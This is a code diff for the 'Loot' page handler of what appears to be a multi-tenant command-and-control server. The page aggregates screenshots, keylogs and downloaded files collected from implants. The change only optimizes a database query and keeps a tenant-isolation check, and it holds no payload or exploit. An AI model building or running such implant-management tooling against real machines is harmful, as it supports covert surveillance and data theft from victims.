@@ -77,11 +77,14 @@ func mapLootTasks(tasks []db.Task) []lootTaskDTO {
 
 // handleLootPage aggregates loot: screenshots, keylogs, downloaded files across all agents
 func (s *Server) handleLootPage(c *gin.Context) {
-	// Get all agents
-	var agents []db.Implant
-	q := s.db.Order("last_seen desc")
+	// Get the visible agent ids. The page derives its agent filter from the
+	// loot rows themselves, so nothing consumes a full agent list: only the
+	// tenant gate needs the ids, and shipping them as rows cost up to
+	// LootAgentLimit (5 000) full implant models per page load.
+	var agentIDs []string
+	q := s.db.Model(&db.Implant{}).Order("last_seen desc")
 	q = s.tenantScope(q, c)
-	if err := q.Limit(LootAgentLimit).Find(&agents).Error; err != nil {
+	if err := q.Limit(LootAgentLimit).Pluck("id", &agentIDs).Error; err != nil {
 		handleQueryError(c, err, "Failed to query loot agents")
 		return
 	}
@@ -91,9 +94,9 @@ func (s *Server) handleLootPage(c *gin.Context) {
 	// Tenant gate: the screenshot store is keyed by agent dir on disk, so
 	// restrict enumeration to agents visible to the caller — otherwise any
 	// tenant sees every tenant's captures (filenames + timestamps).
-	visibleAgents := make(map[string]bool, len(agents))
-	for _, a := range agents {
-		visibleAgents[a.ID] = true
+	visibleAgents := make(map[string]bool, len(agentIDs))
+	for _, id := range agentIDs {
+		visibleAgents[id] = true
 	}
 
 	var allScreenshots []lootScreenshotDTO
@@ -156,7 +159,6 @@ func (s *Server) handleLootPage(c *gin.Context) {
 	data := gin.H{
 		"Title":         "Sovereign - Loot",
 		"ActiveNav":     "loot",
-		"Agents":        agents,
 		"Screenshots":   allScreenshots,
 		"KeylogTasks":   mapLootTasks(keylogTasks),
 		"DownloadTasks": mapLootTasks(downloadTasks),
